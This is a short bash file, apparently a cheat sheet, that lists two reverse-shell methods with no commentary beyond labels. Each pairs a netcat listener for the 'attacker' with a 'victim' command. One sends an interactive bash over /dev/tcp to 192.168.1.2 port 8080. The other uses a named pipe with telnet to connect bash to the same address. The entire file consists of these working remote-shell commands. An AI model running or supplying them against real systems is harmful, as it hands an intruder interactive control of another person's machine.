#!/bin/bash


# method 1

# attacker
nc -l -n -vv -p 8080

# victim
/bin/bash -i > /dev/tcp/192.168.1.2/8080 0<&1 2>&1

# method 2

# attacker
nc -l -n -vv -p 8080

# victim
mknod backpipe p && telnet 192.168.1.2 8080 0<backpipe | /bin/bash 1>backpipe
